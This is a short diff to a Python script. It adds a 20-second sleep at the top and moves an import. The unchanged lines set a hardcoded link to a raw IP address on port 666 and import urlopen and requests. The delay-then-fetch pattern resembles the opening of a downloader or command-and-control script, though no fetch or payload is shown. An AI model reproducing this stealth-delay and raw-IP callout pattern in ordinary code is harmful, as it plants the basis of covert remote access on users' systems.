@@ -1,11 +1,12 @@
+import time as t
+t.sleep(20)
+
 from urllib.request import urlopen
 import os
 link = "http://213.108.160.85:666/"
 # Import the following modules
 import requests
 import json
-import time as t
-
 
 
  
